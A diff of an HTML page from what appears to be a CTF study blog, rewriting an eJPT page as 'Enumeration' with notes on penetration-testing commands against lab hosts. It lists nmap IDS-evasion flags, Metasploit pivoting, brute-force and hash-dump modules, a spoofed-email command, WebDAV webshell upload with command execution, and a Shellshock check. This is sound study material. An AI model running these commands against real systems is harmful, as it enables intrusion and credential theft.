@@ -7,8 +7,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 
-<title>Assessment Methodology - CTF Journey</title>
-<meta name="description" content="Assessment Methodology">
+<title>Enumeration - CTF Journey</title>
+<meta name="description" content="Enumeration">
 
 <meta name="author" content="GitHub Contributor Team"><script type="application/ld+json">
 {
@@ -46,7 +46,7 @@
         "position": 3,
         "item": {
           "@id": "https:\/\/ctf-journey.github.io\/notes\/cert\/ejpt-assesment-methodology\/",
-          "name": "Assessment methodology"
+          "name": "Enumeration"
         }
     }]
 }
@@ -57,10 +57,10 @@
   "author": {
     "name" : "GitHub Contributor Team"
   },
-  "headline": "Assessment Methodology",
-  "description" : "Assessment Methodology",
+  "headline": "Enumeration",
+  "description" : "Enumeration",
   "inLanguage" : "en",
-  "wordCount":  10 ,
+  "wordCount":  465 ,
   "datePublished" : "0001-01-01T00:00:00",
   "dateModified" : "0001-01-01T00:00:00",
   "image" : "https:\/\/ctf-journey.github.io\/",
@@ -79,8 +79,8 @@
 }
 </script>
 
-<meta property="og:title" content="Assessment Methodology" />
-<meta property="og:description" content="Assessment Methodology">
+<meta property="og:title" content="Enumeration" />
+<meta property="og:description" content="Enumeration">
 <meta property="og:url" content="https://ctf-journey.github.io/notes/cert/ejpt-assesment-methodology/" />
 <meta property="og:type" content="website" />
 <meta property="og:site_name" content="CTF Journey" />
@@ -178,6 +178,22 @@ if (!doNotTrack) {
 
               
               
+              
+
+              <li class="nav-item">
+
+                
+                
+                
+                
+                
+
+                <a class="nav-link " title="eJPT"
+                  href="/tags/ejpt"> eJPT</a>
+              </li>
+
+              
+              
 
               <li class="nav-item nav-link">
                 <a id="dark-mode-toggle" class="bi bi-moon-stars" role="button"></a>
@@ -228,7 +244,7 @@ if (!doNotTrack) {
 
               
               <h1 class="fw-semibold display-5 lh-1 mb-3"> 
-                Assessment Methodology
+                Enumeration
                 
               </h1>
               
@@ -271,12 +287,125 @@ if (!doNotTrack) {
       <article role="main" class="blog-post">
         <h2 id="information-gathering">Information Gathering</h2>
 <ul>
-<li>Active</li>
-<li>Passive</li>
+<li>Passive: whois, whatweb, dnsrecon, wafw00f, sublist3r, google dorks, theharvester</li>
+<li>Active: dns zone transfer, nmap</li>
 </ul>
 <h2 id="footprinting--scanning">Footprinting &amp; Scanning</h2>
+<ul>
+<li>basic osi layer stuff networking</li>
+<li>nmap commands
+<ul>
+<li><code>sn</code> for ping sweep</li>
+<li>scan common ports first for faster results, like <code>-P22,23,80,443,3389</code></li>
+</ul>
+</li>
+<li>Firewall detection &amp; IDS evasion
+<ul>
+<li>using malformed packets</li>
+<li>fragment packets with <code>-f (MTU)</code></li>
+<li>optimising nmap with <code>-T4</code></li>
+<li>nmap output formats</li>
+<li>sometimes it makes sense to slow down scans, preventing IDS from detecting</li>
+<li><code>-D</code> to set decoy ip addresses</li>
+<li>output <code>-oN</code> normal, <code>-oX</code> xml for metasploit, <code>-oG</code> grepable format</li>
+</ul>
+</li>
+</ul>
 <h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>host discovery
+<ul>
+<li>using the <code>-sV</code> option</li>
+</ul>
+</li>
+<li>import nmap into msf
+<ul>
+<li>using the <code>db_import</code> and <code>db_nmap</code></li>
+</ul>
+</li>
+<li>msf auxiliary modules using <code>search</code></li>
+<li>steps to exploit
+<ul>
+<li>nmap, scan services, check for msf exploits</li>
+</ul>
+</li>
+<li>pivot to another subnet using msf
+<ul>
+<li>enter <code>shell</code>, use <code>ip addr</code> to look for next subnet</li>
+<li>use <code>run autoroute -s 192.180.108.2</code></li>
+<li>use <code>portscan</code> tcp to scan the next subnet, set <code>ports</code> to 1-1000</li>
+<li>use <code>sessions -i 1</code> to switch between sessions</li>
+<li>use <code>upload /root/static-binaries/nmap /tmp/nmap</code> to upload payloads</li>
+</ul>
+</li>
+<li>ftp enumeration
+<ul>
+<li>two msf modules, <code>ftp_version</code> and <code>ftp_login</code></li>
+<li>for <code>ftp_login</code>, you can set a <code>USER_FILE</code> and <code>PASS_FILE</code></li>
+</ul>
+</li>
+<li>smb enumeration
+<ul>
+<li>using nmap, <code>nmap --script smb-os-discovery.nse -p 445</code></li>
+<li>msf modules like <code>smb_version</code></li>
+<li>get netbios name of samba <code>nmblookup -A demo.ine.local</code></li>
+<li>list shares <code>smbclient -L demo.ine.local -N</code></li>
+<li>anonymous samba connection <code>rpcclient -U &quot;&quot; -N demo.ine.local</code></li>
+</ul>
+</li>
+<li>apache enumeration
+<ul>
+<li>using msf modules like <code>http_version</code>, <code>robots_txt</code>, <code>http_header</code>, <code>brute_dirs</code>, <code>dir_scanner</code>, <code>dir_listing</code>, <code>files_dir</code>, <code>http_put</code>, <code>apache_userdir_enum</code></li>
+</ul>
+</li>
+<li>mysql enumeration
+<ul>
+<li>using msf modules like <code>mysql_version</code>, <code>mysql_login</code>, <code>mysql_enum</code>, <code>mysql_sql</code>, <code>mysql_file_enum</code>, <code>mysql_hashdump</code> (one credentials can dump all password hashes), <code>mysql_schemadump</code>, <code>mysql_writable_dirs</code></li>
+</ul>
+</li>
+<li>ssh enumeration
+<ul>
+<li>using msf modules like <code>ssh_version</code></li>
+<li>ssh bruteforce using msf module <code>ssh_login</code></li>
+</ul>
+</li>
+<li>smtp enumeration
+<ul>
+<li>connect to the server using <code>netcat</code> and <code>telnet</code></li>
+<li>using <code>smtp-user-enum -U usernames.txt -t demo.ine.local</code></li>
+<li>msf module <code>smtp_enum</code>, get usernames</li>
+<li><code> -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m &quot;Hi root, a fake from admin&quot; -o tls=no</code> command to send email</li>
+</ul>
+</li>
+</ul>
 <h2 id="vulnerability-assessment">Vulnerability Assessment</h2>
+<ul>
+<li>webdav, iis server davtest
+<ul>
+<li>webdav is a file management tool</li>
+<li>testing anonymous connection, <code>davtest -url http://demo.ine.local/webdav</code></li>
+<li>testing password login, <code>davtest -auth bob:password_123321 -url http://demo.ine.local/webdav</code></li>
+<li>actual logging in <code>cadaver http://demo.ine.local/webdav</code> and use <code>put /usr/share/webshells/asp/webshell.asp</code> to upload payload</li>
+<li>code execution using <code>http://demo.ine.local/webdav/webshell.asp?cmd=whoami</code> after uploading payload</li>
+</ul>
+</li>
+<li>shellshock
+<ul>
+<li>shellshock is an RCE vulnerability caused by bash environmental variables</li>
+<li>look for a cgi file in the website source code</li>
+<li>check for shellshock vulnerability using nmap and the cgi file <code>nmap --script http-shellshock --script-args &quot;http-shellshock.uri=/gettime.cgi&quot; demo.ine.local</code></li>
+<li>steps to exploit is on github <a href="https://github.com/opsxcq/exploit-CVE-2014-6271">https://github.com/opsxcq/exploit-CVE-2014-6271</a></li>
+<li>capture the network traffic, send to repeater and replace the <code>user-agent</code> header with the payload</li>
+</ul>
+</li>
+<li>wmap web app scan
+<ul>
+<li>its a plugin in msf, can be loaded using <code>load wmap</code></li>
+<li>add the target (both ip and url) using <code>wmap_sites -a 192.157.89.3</code> and <code>wmap_targets -t http://192.157.89.3</code>, check added sites with <code>wmap_sites -l</code> and <code>wmap_targets -l</code></li>
+<li>start the scan with <code>wmap_run -t</code> and use enabled modules with <code>wmap_run -e</code></li>
+</ul>
+</li>
+</ul>
 
       </article>
     </div>
@@ -334,8 +463,8 @@ if (!doNotTrack) {
         
         <li class="list-group-item b-0 p-0">
 
-          <a type="button" class="btn btn-dark" role="button" href="https://ctf-journey.github.io/notes/guides/binary-exploitation/"
-            data-toggle="tooltip" data-placement="top" title="Binary Exploitation">&larr;
+          <a type="button" class="btn btn-dark" role="button" href="https://ctf-journey.github.io/notes/cert/ejpt-exam-review/"
+            data-toggle="tooltip" data-placement="top" title="Exam Review">&larr;
             Previous Post</a>
         </li>
         
@@ -343,8 +472,8 @@ if (!doNotTrack) {
 
         
         <li class="list-group-item ms-auto b-0 p-0">
-          <a type="button" class="btn btn-dark" role="button" href="https://ctf-journey.github.io/notes/writeups/ctf-2022-lnc-v2/"
-            data-toggle="tooltip" data-placement="top" title="Lag N Crash 2.0 CTF">Next Post
+          <a type="button" class="btn btn-dark" role="button" href="https://ctf-journey.github.io/notes/guides/cryptography/"
+            data-toggle="tooltip" data-placement="top" title="Cryptography">Next Post
             &rarr;</a>
         </li>
         
